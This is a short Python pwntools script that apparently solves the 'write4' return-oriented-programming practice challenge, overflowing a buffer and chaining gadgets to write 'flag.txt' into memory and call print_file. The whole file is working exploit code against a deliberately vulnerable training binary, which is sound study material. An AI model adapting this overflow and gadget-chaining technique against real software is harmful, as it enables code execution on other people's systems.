from pwn import * 
import sys

binary = './write4'

DEBUG = True


pop_r14_r15 = 0x400690
empty_data = 0x601028
flag = b'flag.txt'
mov_r14_r15 = 0x400628
pop_rdi = 0x400693
print_file = 0x0000000000400510
fopen = 0x7ffff7c00965

default_data = 0x7ffff7c00a37




padding = b'a' * 40

payload = padding
payload += p64(pop_r14_r15)
payload += p64(empty_data)
payload += p64(u64(flag))
payload += p64(mov_r14_r15)
payload += p64(pop_rdi)
payload += p64(empty_data)
payload += p64(print_file)

sys.stdout.buffer.write(payload)

